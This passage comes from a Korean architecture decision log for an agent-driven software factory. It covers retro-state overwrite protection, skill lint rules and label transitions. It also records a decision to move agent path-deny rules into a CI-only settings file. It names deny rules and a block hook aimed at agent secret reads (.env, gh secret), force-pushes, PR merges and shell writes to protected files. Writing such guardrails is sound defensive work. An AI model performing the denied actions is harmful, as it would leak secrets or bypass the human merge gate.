- **`_retro.md` 하이드레이트/no-clobber (리뷰 Critical, 계획 문서에 없던 실행 판결)**. 초판은 `readRecords`(설계상 절대 던지지 않는다)로 상태를 읽어, fetch 실패와 "기록 없음"을 구별하지 못한 채 기본 상태로 브랜치를 덮어쓸 수 있었다. 판결: `factory/lib/records-branch.js`에 `readRecordsDetailed({run,cwd,branch,dir}) → {records, blobs, fetched, exists, failures, parent}`를 추가(`readRecords`는 `.records`만 돌려주는 얇은 래퍼가 됐다) — `fetched`는 "브랜치 내용을 확정했다"를 뜻하고, fetch가 실패했을 때는 `git ls-remote --exit-code`(0=있음, 2=없음, 그 외=오류)로 "없다"와 "모른다"를 가른다. `runRetro`는 `hydrate()`가 던지거나 `fetched === false`거나 `_retro.md`가 브랜치에 있는데 못 읽었으면(`stateFailed`) **exit 2로 아무것도 쓰지 않고 끝난다**(writeState·sync·claudeP 전부 호출하지 않음). 브랜치에 `_retro.md`가 아예 없으면(첫 실행) 기본 상태로 진행하고 `expectBlob: {"_retro.md": null}`로 "생성이지 교체가 아니다"를 명시한다. `syncRecords({overwrite:["_retro.md"], expectBlob})`는 교체 전에 parent 트리의 그 blob sha가 하이드레이트한 sha와 같은지 확인하고 다르면(누군가 먼저 밀었다) 아무것도 밀지 않고 `{ok:false, moved:true}`를 돌려준다 — `runRetro`는 그때 한 번만 재하이드레이트해 **같은 순수 변이(`applyMutation(base, mutation)`)를 새 base에 재적용**하고 재시도하며, 그래도 움직였거나 재하이드레이트가 다시 실패하면 exit 1(맹목적 덮어쓰기 금지). `_retro.md`는 `overwrite`(통째로 재렌더)로만 동기화한다 — run 기록(append-only 로그)에 쓰는 꼬리-병합 규칙을 그대로 쓰면 새 렌더가 옛 렌더의 접두어가 아니므로 마커·JSON 펜스가 파일에 두 개 생기고 다음 retro가 첫 펜스(옛 상태)만 읽어 커서가 영원히 전진하지 않는다. `hydrate`는 `_retro.md`만 로컬을 덮어써 복원한다(run 기록은 아직 push 안 된 로컬 꼬리일 수 있어 "없을 때만 복원"이 맞지만 `_retro.md`는 브랜치가 유일한 진실이다). `_retro.md`의 기계 블록은 마커 `<!-- factory-retro-state:v1 -->` + JSON 펜스이고 그 위에 사람용 통계·이력 표를 둔다.

**결정**: 위 관측대로 P4-R1~R7과 다섯 가지 실행 판결(needs-human "도달" 게이트로의 정정·K 무효화, 통계의 창/누적 분리, ISO 주차는 `period.from`, 성숙도 격차의 분석-전-계산, `_retro.md`의 하이드레이트 provenance + no-clobber 재적용)을 Plan 4의 확정 동작으로 채택한다. retro는 절대 라벨을 옮기지 않고 코드를 고치지 않는다 — 산출은 lessons/예시/관점 append(다크 자체 머지), 제안 PR(사람 머지), harness/rewrite 이슈 생성, `quarantine.toml`·`_retro.md` 갱신뿐이라는 계획의 전제는 구현 전체에서 위반 없이 유지됐다(모든 경로가 fake deps 주입 테스트로 확인됨).

**이월(carry-over) 처리**: Plan 3 최종 리뷰의 이월 세 건을 이 Plan에서 마감했다 — `factory/cli/init.js`의 `GITIGNORE_ENTRIES`에 `test-results/`·`coverage/`·`.nyc_output/` 추가(`init.test.js`가 검증); `templates/factory/claude/agents/factory-retro.md`가 설치되어 `checkRoles`의 `roles.retro-agent-file`이 이제 PASS(과거의 "arrives with Plan 4" WARN 경로는 더 이상 밟히지 않는다); Plan 3의 Bash matcher 확장(ADR-016 F6) 이전에 `factory init`한 저장소는 `factory init --upgrade`로 신규 훅 배선(`deny-all-writes.sh` Bash arm, `factory-retro.*`)을 받아야 한다.

**알려진 한계**: `bin/retro.js`의 `main()`(`gh.issueList` 등 실제 deps 조립)은 fake-deps 단위 테스트로만 검증됐고 첫 dogfood 러너 실행에서 실제 응답 모양이 드러난다(`runRetro`·`applyMutation`·`readRecordsDetailed`·`syncRecords` 본체는 전부 테스트됨). retro 잡의 트리거는 `factory:merged` 라벨/전이 코멘트로 머지를 감지하므로 타이밍이 한 머지만큼 뒤처질 수 있으나 다음 실행이 자연히 따라잡는다(자기 교정). 코멘트 fetch 비용은 창에서 움직인 이슈 수에 선형이다(이슈가 많아지면 30분 timeout을 위협할 수 있음 — delta 필터가 완화하되 이슈 200개 상한은 명시적으로 고정된 값이다).

**영향**: §8.1(처리 스크립트를 실제 파일명으로, 경량 수확이 결정적이라는 문장), §8.4(`_retro.md` 위치·마커·`merges_since`·`stats_total`·하이드레이트/no-clobber·`light_on_merge`), §5.2.5-⑤(등록 주체=retro·needs-human 도달·코멘트 마커·만료 항목 존치·rewrite/test-delete 경로), §4.1(retro 행에서 "(Plan 4)" 제거, concurrency·checkout ref), §2.1(`factory run retro [--force]`), README(`factory run retro` 한 줄).

**보강 — 최종 리뷰 반영(2026-09-12, 브랜치 전체 리뷰 1라운드)**: Plan 4 전체를 다시 읽은 리뷰가 남긴 지적을 한 번의 fix 라운드로 마감했다. **F1** `applyPolicy`가 만료 항목을 남기므로 sweeper가 매 회차 같은 `expired` 코멘트를 다시 달고 retro가 재작성 이슈를 영원히 다시 만들던 문제 — sweeper가 코멘트를 달기 전에 `gh.comments(issue)`를 읽어 그 id의 같은 종류 마커(`<!-- factory-quarantine <kind> id=… -->`)가 이미 있으면 침묵한다(가장 최근 `registered` 마커 **뒤**만 본다 — 재등록은 새 격리 주기이므로 그 주기의 복귀·만료는 다시 알린다; 코멘트를 못 읽으면 말하지 않는다 — 중복보다 늦음이 낫고 다음 sweep이 되돌린다). **F2** `stats.usage`가 `summarizeUsage(...).total`(전 생애 합)이어서 매 full retro가 공장의 누적 비용을 "이번 창"으로 보고하고 그 값이 `stats_total`에 또 더해지던 이중 집계 — `parseRunRecord` 항목을 `afterSince(e.at, since)`로 걸러 **창 안의** 비용·토큰만 센다(`_retro`는 제외). **F3** 다크 PR이 머지되지 않았는데도(RED·타임아웃·사람이 닫음·PR 없음) 후보를 내리고 yield에 세던 문제 — `lessonsPr?.merged === true`일 때만 `retire`와 lesson/예시 yield를 인정한다(머지되지 않으면 텍스트는 파일에 없으므로 후보는 남고 N도 줄지 않는다). **F4** 에이전트 텍스트에 개행이 섞이면 lessons 항목이 §7.4 형식을 깨거나 역할 파일에 새 `##` 헤더가 생겨 integrity가 PR을 영원히 RED로 만들던 경로 — `lib/retro/text.js`의 `normalizeItemText`(모든 공백류를 단일 공백으로, trim, 300자에서 `…`로 절단, 빈 텍스트는 `empty`로 거부)를 `lessons.js`·`role-additions.js`가 공유한다(절단이 결정적이라 중복 판정도 흔들리지 않는다). **F5** `stop-guard.sh`의 면제 목록에 `factory-retro`가 없어 쓰기 금지 역할이 멈추지 못하는 교착 — 목록에 추가하고, `agent-md.js`의 `needsDenyAllWritesHook`를 export해 hooks 테스트가 **역할마다 셸 프로브**를 돌려 두 판정이 같은 집합인지 대조한다. **F6** 다크 PR에 실릴 경로를 `splitDarkFiles`가 `.factory/lessons/<f>.md`·`.claude/agents/<f>.md`로 제한하고(자체 머지의 안전성이 그 두 경로에만 걸린 integrity 규칙에 기대므로) 거절 경로를 `applied[]`에 남긴다. **F7**은 이 라운드의 지시 목록에 없어 코드 변경이 없다. **F8** 만료 코멘트 스캔만 `factory:flaky`를 `state:"all"`로 읽는다(sweeper는 닫힌 이슈에도 만료를 남긴다) — 등록·dedup·삭제 후보는 여전히 열린 이슈만 본다; 스냅샷 수집은 `collectIssues`로 분리해 테스트한다. **F9** 같은 기간 마커(`<!-- factory-retro:v1 period=… -->`) 또는 같은 제목의 열린 `factory:retro-proposal` PR이 있으면 `publishProposal`을 건너뛰고 `proposal: skipped (duplicate #n)`을 기록한다(`gh.prList`가 `body`까지 받도록 확장). **F10** `claude -p` 봉투의 `total_cost_usd`/`usage`를 `stats.retro_usage`로 걷어 `stats_total`에 따로 누적하고(스테이지 비용과 섞지 않는다; 한 회차가 센트 미만일 수 있어 반올림은 1e-6) 통계 표에 `retro cost (usd)`·`retro tokens` 두 줄로 낸다 — 분석이 실패한 회차의 비용도 기록한다. **F11** full 경로에서 `writeState`가 던지거나 sync가 던지거나 `{ok:false}`(non-moved)를 돌려주면 exit 1이다 — 여기까지 왔으면 부수 효과(PR·이슈·`quarantine.toml`)는 이미 일어났고, 그 사실을 적은 상태를 잃은 채 0으로 물러나면 다음 회차가 같은 창을 다시 처리한다(경량 실행은 적용한 것이 없으므로 기록만 남기고 0을 유지한다). 함께 이월 #2도 마감했다: 재하이드레이트에서 브랜치의 `_retro.md`가 **사라졌는데** 우리가 교체를 걸고 있었다면 로컬 파일(방금 우리가 쓴 변이본)을 다시 읽지 않고 `parseRetroState("")`에서 시작한다 — 그러지 않으면 같은 변이가 두 번 얹힌다.

---

## ADR-018 Plan 5 판결 — Define 스킬도 5섹션, `:status`는 CLI 래퍼, 드라이런은 가능한 것만, wont-do는 close+decision — 2026-09-12

**질문**: Plan 5(13개 스킬 카탈로그 — Define 5 + Operate 8 — 과 그 lint·doctor·설치 배선)를 실행하려면 §13.1~13.4가 확정하지 않은 실행 세부 다수에 답해야 했다: Define 4개 기존 스킬도 §13.3의 6섹션 구조를 갖춰야 하는지, `doctor`의 `checkSkills`가 카탈로그 13개만 보는지 설치 디렉터리 전부를 보는지(그러면 비-카탈로그 `architect`/`designer`도 대상인지), `:status`가 `factory status`의 로직을 다시 계산하는지 CLI를 그대로 부르는지, `:proposal`·`:harness`의 "드라이런"이 항상 실행 가능한지, 라벨 그래프에 없는 `wont-do`를 `:unstick`이 어떻게 집행하는지, `:role` Step 4가 리뷰어와 plan 토론자를 CHARTER의 어느 필드로 가르는지, "`factory:harness` PR"이 실제로 무엇을 가리키는지. Task 1~5(SDD ledger 실행) 전부와 이번 Task 6(문서·설치 스모크)에서 확정했다.

**관측** (Task 1~6 구현, `factory/lib/skill-md.js`·`factory/lib/doctor/factory.js`·`factory/lib/agent-md.js`·`factory/lib/config.js`·`templates/know-thy-build/*.md`):

- **P5-R1 — Define 스킬도 5섹션, 그리고 비-카탈로그 helper도.** `project`/`technical`/`qa`/`feature`/`issue`(Define 5) 전부가 `## Language` 바로 뒤, 기존 소크라테스 본문 앞에 §13.3의 5섹션 요약 블록(`## Trigger`~`## Must not`)을 갖춘다(Task 2·3, `factory/test/skills-phase1.test.js`·`skills-ops-a.test.js`). `doctor`의 `checkSkills`(`factory/lib/doctor/factory.js`)는 카탈로그 13개로 좁히지 않고 `.claude/commands/know-thy-build/`의 `.md` **전부**를 `lintSkillMd(text, {name, installed:true})`로 lint한다 — 그래서 카탈로그 밖의 두 helper `architect`/`designer`(Phase 1에서 `:feature`가 부르는 보조 스킬, §13.2 표 밖)도 같은 구조를 갖추지 않으면 doctor가 FAIL을 보고한다. 이번 Task 6이 그 둘에 블록을 추가했다(`templates/know-thy-build/architect.md`·`designer.md`, `factory/test/skills-helpers.test.js`).
- **구조 규칙**(`lintSkillMd`, `factory/lib/skill-md.js`): frontmatter `description`(비어있지 않은 문자열), `allowed-tools`(배열, ≥1), `{{LANG}}`(template)/`## Language`(installed), 6섹션이 정해진 순서로 존재(추가 섹션은 허용). 운영 스킬(`harness next clarify unstick proposal role digest status`)은 `transition.js`와 `human-decision:v1`을 본문에 언급해야 한다(`digest`/`status`는 읽기 전용이라 예외 — `READ_ONLY_OPS`), 그리고 `gh pr merge`를 금지하는 문장을 **한 줄에** 부정어(`never`/`must not`/`forbidden`/`prohibited`/`do not`/`don't`/`no`/`금지`)와 함께 담아야 한다(`hasGhPrMergeProhibition`).
- **P5-R2 — 큐 진입의 실제 명령**. `:issue --now`와 `:next`가 실행하는 라벨 전이는 둘 다 같은 한 줄이다: `node .factory/bin/transition.js <issue> factory:queue --human --reason "…"` (라벨 그래프의 `backlog → queue` 엣지). 스킬은 절대 라벨을 손으로 옮기지 않고 이 스크립트를 통해서만 집행한다(§13.1 원칙 2).
- **P5-R3 — `:status`는 CLI 래퍼다**. `status.md`는 상태를 다시 계산하지 않는다 — `npx know-thy-build factory status`(§13.4가 명시하는 그 비대화형 버전)를 실행하고 그 출력을 그대로 사람에게 보여준 뒤, Needs You 각 항목에서 바로 이어질 다음 명령(`:unstick 118` 등)만 얹는다. 두 갈래(스킬의 서술과 CLI의 실제 렌더링)가 갈라지면 "상태"가 두 가지 진실을 갖게 되므로, 계산은 CLI 하나에만 둔다.
- **P5-R4 — 드라이런은 가능한 것만, 아니면 사유**. `:proposal`은 제안 종류별로 실제 드라이런이 가능하다(lint 규칙 → 과거 PR diff에 적용해 적중 수 세기; 임계 조정 → 과거 run 값 분포로 통과/실패 재계산; 새 리뷰어 → 과거 PR 몇 건에 실제로 spawn). 그러나 일부 제안(예: Lens 문구 변경, 성숙도 승격 그 자체)은 재계산할 과거 데이터가 없거나 무의미하다 — 그때는 "드라이런 불가 사유"를 문장으로 밝히고, **승인 권고를 하지 않는다**(권고는 드라이런 결과가 있을 때만 낸다). `harness.md`의 (c) 경로(승격 PR 검토)도 같다 — diff가 실제로 gate에 무엇을 추가하는지·소요·스모크 GREEN 여부는 계산하지만, "이 승격이 옳다"는 권고는 스모크가 실제로 GREEN일 때만 낸다.
- **P5-R5 — 시험 실행은 `claude -p --agent`**. `:role`의 시험 실행 단계는 `claude -p --agent <name>`으로 과거 PR 1~2건에 그 역할만 spawn한다. `<name>`은 즉석에서 짓지 않는다 — `.claude/agents/`에 실재하는 파일 목록에서 고른다. 실행 전에 반드시 토큰 비용 경고(예상 스캔 PR 수 × 역할당 평균 비용)를 먼저 보여주고 사람의 진행 확인을 받은 뒤에만 호출한다.
- **P5-R6 — `:digest`는 정확히 그 경로에만 쓴다**. `docs/factory/digests/YYYY-Wnn.md` 하나만 쓰고, 코드·라벨·이슈·PR은 절대 건드리지 않는다(읽기 전용, `READ_ONLY_OPS`). 발견한 결함은 이 스킬이 만들지 않고 `/know-thy-build:issue`로 사람을 보낸다(§13.3 원문의 `:feature --bug`는 §10에서 이미 `:issue`로 분리됐으므로 이번 Task 6에서 스펙 문언을 정정했다).
- **P5-R7 — project의 Operations = M0 하네스 구축**. `:project`의 개정된 Operations 섹션은 스택 결정 → 러너 설치 → unit 스모크 → `harness.toml`(maturity M0 초안) → `factory doctor` 실행이고, 통과 전에는 `complete`로 표시하지 않는다(§10 표, `project.md`).
- **wont-do — `:unstick`에서는 라벨 전이가 아니라 close+decision**. `factory/lib/labels.js`의 `TRANSITIONS`(§3.2)에서 `factory:needs-human`의 유일한 출구는 `factory:queue`다(labels.js:21) — `needs-human → wont-do` 엣지는 존재하지 않는다. `factory:wont-do` 자체는 실재하는 상태다(`STATES`, labels.js:2)와 `factory:queue → factory:wont-do` 엣지(labels.js:10, triage의 처분 — 스펙 109행)가 있지만, 그 경로는 triage가 `queue`에서 직접 판정할 때만 쓰인다. `needs-human`에 도달한 이슈를 사람이 wont-do로 판단하는 경우는 그 엣지를 탈 수 없으므로(`needs-human`은 `wont-do`로 못 간다), `:unstick`은 라벨 전이 대신: 이슈에 `human-decision:v1` 코멘트(`decision: wont-do`, 사유)를 남기고 `gh issue close <n> --reason "not planned"`로 닫는다(`unstick.md`). 스펙 §13.3 `:unstick` Does 3단계의 `transition.sh --human`은 실재하지 않는 이름이었다 — 실제 스크립트는 `transition.js`이므로 이번 Task 6에서 정정하고, `wont-do 판단` 선택지에 "라벨 전이가 아니라 close + human-decision"이라는 실행 방식을 명시했다.
- **핸드오프 무효화 마커는 사람/회고를 위한 provenance일 뿐 — 소비하는 코드가 없다**. `:unstick`이 이슈를 분할한 뒤 남기는 `<!-- factory-handoff-invalidated stage=plan … -->`는 어떤 스크립트도 파싱하지 않는다. 재큐된 이슈는 triage부터 다시 돌고(스펙상 `queue`는 triage → plan 순서를 다시 밟는다), `handoff.js`의 `latestHandoff`는 단순히 타임스탬프가 가장 최신인 핸드오프를 고른다 — 무효화 마커가 있든 없든 최신이 이긴다. 그래서 이 마커의 유일한 소비자는 사람과 retro다(왜 이 핸드오프가 폐기됐는지의 기록).
- **"`factory:harness` PR"의 실체**. `:harness` Trigger (c)가 말하는 그 PR은 `factory:harness` **라벨이 붙은 이슈**의 파이프라인 PR이다 — 라벨은 PR에는 결코 붙지 않는다(이슈 라벨 그래프의 라벨이다). 찾는 절차: open `factory:harness` 이슈를 나열 → 각 이슈 번호로 `gh pr list --head claude/fq-<n>`(implement가 그 브랜치 이름으로 push한다) → 실패하면 `gh issue view <n> --json closedByPullRequestsReferences`로 대체.
- **`:role` Step 4는 역할 종류로 CHARTER 필드가 갈린다**. 리뷰어는 CHARTER의 `roster:`에, plan 토론자는 `plan_roles`에 등록된다 — `factory/lib/config.js:36`의 `rosterFor(charter, roles, stage, tier)`가 그 필드를 고른다. **정정(최종 리뷰)**: 이 함수는 이름의 접두어를 보지 않는다 — 인자로 받은 **스테이지**(`"review"`면 `charter.roster[tier]`, `"plan"`이면 `charter.plan_roles[tier] || charter.plan_roles.default`)로 고르고, 고른 이름이 `roles[stage]`에 정의돼 있는지만 대조한다. 그리고 CHARTER 로스터에 들어가는 것은 **접두어 없는 짧은 이름**(`correctness`, `security`)이며, `roles.toml`의 `[review.<short>] agent = ".claude/agents/reviewer-<short>.md"`가 그 짧은 이름을 접두어 붙은 파일로 매핑한다. 즉 접두어가 붙는 자리는 파일 경로와 에이전트 frontmatter `name`뿐이다 — 이 규약을 `:role` 본문 전체에 일관되게 반영했다(최종 리뷰 I2). 등록될 필드가 없는 역할(예: 오타로 두 접두어 다 아닌 이름)은 `lintAgentMd`를 통과해도 `roles.toml`의 어떤 `[plan.*]`/`[review.*]`에도 없으므로 **결코 spawn되지 않는다** — lint가 깨끗해도 배선이 빠지면 죽은 코드다. §7.2의 쓰기 금지 목록은 `needsDenyAllWritesHook`(`factory/lib/agent-md.js`)이 실제로 검사하는 이름 집합보다 좁았다 — 코드는 이미 `factory-retro`를 포함하고 있었는데(P4-R4, retro는 근거만 내고 쓰지 않는다) §7.2의 문장이 나열에서 빠뜨렸다. 이번 Task 6에서 §7.2 문장에 `factory-retro`를 추가해 코드와 스펙을 맞췄다.
- **금지 문자열 규칙이 §13.3 원문 인용보다 우선한다**. `factory/test/skills-phase1.test.js`의 FORBIDDEN 검사(`worktree`·`check-merge-gate`·`finish`·`sub-agent`)는 대소문자 무시 전체 파일 스캔이다 — §13.3 문언을 그대로 인용하면 그 문언 자체가 금지어를 담을 수 있다(예: 삭제된 "Worktree Workflow" 섹션 이름을 한국어로 번역해 인용하면 원문은 "워크트리"라 영문 스캔을 피하지만, 영문 스킬 본문에서 그 섹션을 설명할 때는 "worktree"라는 단어를 쓰지 않고 다른 말로 풀어써야 한다). Task 2가 `project.md`를 개정할 때 이 규칙을 실제로 적용했다: 삭제된 "Worktree Workflow" 섹션을 가리켜야 하는 자리에서 그 단어를 쓰지 않고 풀어썼다. `architect`/`designer`에 추가한 새 6섹션 블록(이번 Task 6)도 같은 이유로 §13.3 문언을 그대로 옮기지 않고 새로 썼다 — Task 6 시점에는 이 둘의 **본문**이 아직 옛 worktree+sub-agent 흐름을 그대로 들고 있었고(그 Task의 지시가 본문은 손대지 말라는 것이었다) 새 블록까지 그 단어를 쓰면 스캔이 걸릴 자리가 생겼기 때문이다. **정정(최종 fix 라운드, 커밋 `4b82e8d`)**: 그 흐름은 이제 두 파일에서 **제거됐다** — "Worktree detection" 절은 `docs/features/NNN.md`를 읽으라는 두 문장으로, "Gate Update" 절은 "리뷰 상태는 팩토리의 이슈 라벨이 기록하며 `gate:` 필드는 없다"는 한 문단으로 바뀌었고, `architect.md`의 `sub-agent`는 실제로 하는 일(에이전트 오케스트레이션)대로 `agent`로 리워딩했다. 그래서 FORBIDDEN 스캔은 이제 Phase 1 네 개와 `architect`/`designer`를 **똑같이** 덮으며(예외 없음), 두 helper에는 fenced yaml 블록에 `gate:`가 없다는 검사도 함께 붙었다(`factory/test/skills-phase1.test.js`).
- **이월(carry-over) — Plan 4의 자체 머지 실패 lessons PR**. retro가 스스로 머지하지 못한 lessons PR(integrity RED, 폴링 timeout, `gh.mergePr` 예외)은 `factory:needs-human` 라벨을 달고 열린 채로 남는다(ADR-017 P4-R2). `:proposal`은 이런 PR도 다룬다 — 막힌 원인이 리베이스로 해결 가능하면(오래된 base) 리베이스 후 integrity 재실행을 권하고, 아니면 PR을 닫고 다음 정기 full retro가 같은 후보를 다시 모아 새 PR을 열게 한다(Plan 4에는 "재오픈 dedup"이 없다 — 닫힌 PR은 다시 열리지 않고, 후보가 남아있으면 다음 회차가 새로 연다).
- **§13.3 `## Produces`는 §10보다 좁은 요약이다 — 스킬은 §10을 따른다**. `:qa`의 §13.3 Produces는 `docs/QA.md`만 적지만 §10은 `harness.toml [test] [test.env] [test.fakes]`·`docker-compose.test.yml`·`.env.test`·스모크 테스트까지 요구한다(`qa.md`는 §10을 따라 이 전부를 만든다). `:technical`의 §13.3 Produces는 CHARTER 초안까지만 적지만, §10과 `technical.md`는 CHARTER의 `load_bearing`·`NEVER_AUTOMATE`·`tier_default`가 TDR에서 **도출**되는 경로까지 구현한다(코드가 직접 쓰는 파일은 여전히 TECHNICAL.md와 CHARTER.md 초안뿐이다). §13.3은 "사람 지점" 관점의 압축 요약이고 §10은 "무엇이 바뀌는가"의 상세 목록이라, 둘이 갈리면 후자를 구현이 따른다.

- **`:next`의 "스펙 없는 이슈" Must not은 출처를 묻는 것이지 스펙 유무를 묻는 것이 아니다** (최종 리뷰 확인). `:next`의 Must not에 있는 "스펙이 없는 이슈를 queue로"는 `/know-thy-build:issue`로 만든 이슈를 막는 규칙이 **아니다** — 그 이슈들은 애초에 스펙 문서를 만들지 않는 것이 정상이고(`:issue`의 Produces = 이슈 하나, 스펙 파일 없음) 그대로 큐에 들어간다. 이 Must not이 가리키는 것은 **`/know-thy-build:feature`가 만들었어야 할 이슈**, 즉 설계 결정이 이슈 본문 안에 숨어 있는데 스펙 없이 들어온 경우다. `next.md` Step 3의 서술이 그대로 옳으므로 유지한다.
- **사전 조건 가드가 운영 스킬 8개 전부에 있다** (최종 리뷰 C2). 스킬은 `npx know-thy-build`가, factory는 `factory init`이 설치한다 — 두 경로가 별개라 스킬만 깔린 저장소가 실재한다. `harness`·`next`·`clarify`·`unstick`·`proposal`·`role`·`digest`·`status`는 집행 규칙 블록 첫 문단에서 `.factory/bin/run-stage.js`의 존재를 먼저 확인하고, 없으면 `factory가 아직 없음 — npx know-thy-build factory init` 한 줄만 출력하고 멈춘다(그러지 않으면 첫 `node .factory/bin/transition.js` 호출이 ENOENT로 죽고, 그 실패는 사람에게 무엇을 해야 하는지 말해주지 않는다).

**결정**: 위 관측대로 P5-R1~R7과 세 가지 이번 Task 6 실행 판결(wont-do는 close+`human-decision`, §13.3 대 §10 우선순위는 §10, 금지 문자열 규칙이 원문 인용보다 우선)을 Plan 5의 확정 동작으로 채택한다. 13개 카탈로그 스킬 + `architect`/`designer`(비-카탈로그) 전부가 §13.3의 6섹션 구조를 갖추고, `doctor`가 그 전부를 이름과 무관하게 lint한다는 전제가 구현 전체에서 유지됐다.

**알려진 한계**: 스킬 본문은 LLM이 따르는 프로즈다 — `lintSkillMd`가 기계로 검사하는 것은 구조(frontmatter·섹션 존재·순서)와 몇 개의 고정 문자열(`transition.js`·`human-decision:v1`·`gh pr merge` 금지 문장)뿐이고, 그 문장이 실제로 서술하는 흐름이 옳은지·사람이 스킬을 그대로 따를지는 검사하지 않는다. `checkSkills`는 설치 디렉터리에 있는 낯선 `.md`(카탈로그도 helper도 아닌 파일)를 전부 FAIL로 보고한다 — 관용도가 없으므로 설치 디렉터리에 다른 스킬을 손으로 얹으면 doctor가 항상 빨갛다. 그리고 이 스킬들이 **실제로 실행될 수 있는가**는 Plan 5 구현 내내 검증되지 않은 전제였다 — `.claude/settings.json`의 경로 deny가 `:harness`·`:role`·`:technical`의 쓰기를 사람의 대화형 세션에서까지 막고 있었다(ADR-019가 그 판결이다).

**영향**: §2.1(스킬 개수 12→13, Define 4→5), §7.2(쓰기 금지 목록에 `factory-retro` 추가), §10(표 아래에 `architect`/`designer`가 비-카탈로그로 계속 설치되고 §13.3 블록을 갖춘다는 문장), §13.3(`:unstick` Does 3단계 `transition.sh`→`transition.js`, `wont-do 판단`에 집행 방식 명시, `:digest` Must not의 `:feature --bug`→`:issue`), §13.4(`doctor`의 `skills.<name>`/`skills.missing` 보고 형식, 설치기가 `templates/know-thy-build/`만 복사하고 레거시 `finish.md`를 지운다는 문장), README(Define/Operate 표 갱신, helper 15개 설치 문장, 파이프라인 블록의 `factory` 단계·`sub-agents`→`agents`).

---

## ADR-019 사람-지점 스킬의 L2 — 경로 deny는 `.claude/settings.json`이 아니라 CI 전용 설정에 산다 — 2026-09-12

**질문**: Plan 5가 설치하는 사람-지점 스킬(`:harness`·`:role`·`:technical`·`:project`·`:qa`)은 전부 빌드 설정을 쓰는 것이 자기 일이다 — `:harness`는 `.factory/harness.toml`을, `:role`은 `.claude/agents/<name>.md`와 `.factory/roles.toml`과 CHARTER 로스터를, `:technical`은 `docs/factory/CHARTER.md`를 쓴다. 그런데 `factory init`이 설치하는 `.claude/settings.json`의 deny 목록은 그 경로를 전부 막고 있었다. 스킬이 자기 Does를 수행할 수 없다면 Plan 5는 설치는 되지만 작동하지 않는다. L2를 약화시키지 않으면서 이 충돌을 어떻게 푸는가.

**관측**:

- Claude Code의 deny 규칙은 **세션 종류를 가리지 않는다** — CI의 `claude -p`에도, 사람이 터미널에서 여는 대화형 세션에도 똑같이 걸린다. 그리고 deny는 allow로 덮어쓸 수 없다(ADR-001 스파이크에서 3/3 유효로 확인된 성질이 여기서는 반대로 작용한다). 즉 `.claude/settings.json`에 `Edit(.factory/**)`가 있는 한, 사람이 `/know-thy-build:harness`를 실행해도 `harness.toml`을 고칠 수 없다.
- 반면 CI는 이미 자기 설정 파일을 따로 로드한다: `factory/bin/run-stage.js:407`과 `factory/bin/retro.js:800`이 `claude -p … --settings .factory/ci-settings.json`으로 부른다. `--settings`는 **병합**이고 deny는 병합된 결과에서도 유효하다(ADR-005 관측: cli-settings 레그에서 denied). 그래서 경로 deny를 이 파일로 옮기면 CI 에이전트가 받는 L2는 한 글자도 달라지지 않는다.
- 나머지 세 겹은 그대로다. **L0**: `block-dangerous.sh`는 `PreToolUse(Bash)` 훅이라 설정 파일과 무관하게 **모든 세션**에서 돈다 — `echo > package.json`·`sed -i .factory/harness.toml`·`cp … .claude/settings.json` 같은 셸 모양의 쓰기는 사람의 세션에서도 계속 막힌다(스킬은 Edit/Write 도구로 쓰므로 영향이 없다). **L1**: `integrity.js`가 PR diff에서 보호 경로 변경을 잡고, 그런 PR은 `needs-human`이 되어 사람이 머지한다(ADR-015). **사람의 판단 자체가 판결이다** — `:harness`가 `harness.toml`을 고치는 것은 "에이전트가 게이트를 우회했다"가 아니라 "사람이 게이트를 정했다"이고, 그것이 이 스킬들의 존재 이유다.
- 그래서 `.claude/settings.json`이 계속 들고 있어야 하는 것은 **사람에게도 걸려야 옳은** deny뿐이다: `gh pr merge*`(머지는 파이프라인의 마지막 문이지 세션의 편의가 아니다), `git merge*`, `git push --force*`/`-f*`, branch protection PUT. 이 넷은 사람이 대화형으로 실행할 이유가 있다면 셸에서 직접 하면 되고, 에이전트 세션에서는 언제나 사고다.

**결정**: `templates/factory/claude/settings.json`의 **경로 기반 `Edit(...)`/`Write(...)` deny 전부**를 `templates/factory/factory/ci-settings.json`의 `permissions.deny`로 옮긴다(기존 CI 전용 항목 — `gh secret*`·`gh api -X DELETE*`·`Read(.env*)` — 은 유지). `.claude/settings.json`에는 Bash deny·allow·훅 배선만 남는다. `factory doctor`는 이제 **두 파일을 모두** 검사한다 — `settings.present`/`settings.deny`/`settings.hooks`는 (작아진) settings 템플릿을, 새 `settings.ci-deny`는 `.factory/ci-settings.json`이 존재하고 ci-settings 템플릿의 deny를 전부 담고 있는지를 본다(둘 중 하나라도 빠지면 FAIL). `block-dangerous.sh`의 F9 삼자 일치 주석과 그 일치를 검사하는 테스트(`factory/test/templates.test.js`)의 기준도 `settings.json` deny에서 `ci-settings.json` deny로 옮긴다 — 세 목록(`harness.toml [protected].factory` · `ci-settings.json` deny · 훅의 `prot` 정규식)은 계속 같아야 한다.

**알려진 한계**: 사람의 대화형 Claude는 이제 패키지 소유 파일 `.factory/lib/**`·`.factory/bin/**`도 Edit/Write로 고칠 수 있다 — 경로 deny가 `.factory/**` 통째로였기 때문에 그것까지 함께 풀렸다. 이 문을 다시 좁히려면 `.factory/lib` 하위만 남기는 식의 세분화가 필요하지만, 그러면 "사람은 자기 저장소의 무엇이든 고칠 수 있다"는 사실과 싸우는 설정이 된다 — 대신 **탐지**에 기댄다: `factory doctor`의 `files.stale`이 템플릿과 달라진 팩토리 소유 파일을 전부 보고하고(`factory init --upgrade`가 되돌린다), L1 integrity가 그 변경이 PR에 실리면 잡는다. 또 하나(초판에 적었던 것): `factory init`을 이미 돌린 저장소는 `.claude/settings.json`에 옛 경로 deny가 남아 있고 `mergeSettings`가 **가산적**이라 `--upgrade`로도 지워지지 않았다 — 아래 보강이 이것을 마감한다(`.factory/ci-settings.json`은 팩토리 소유라 `--upgrade`가 통째로 교체하므로 새 deny를 처음부터 자동으로 받았다).

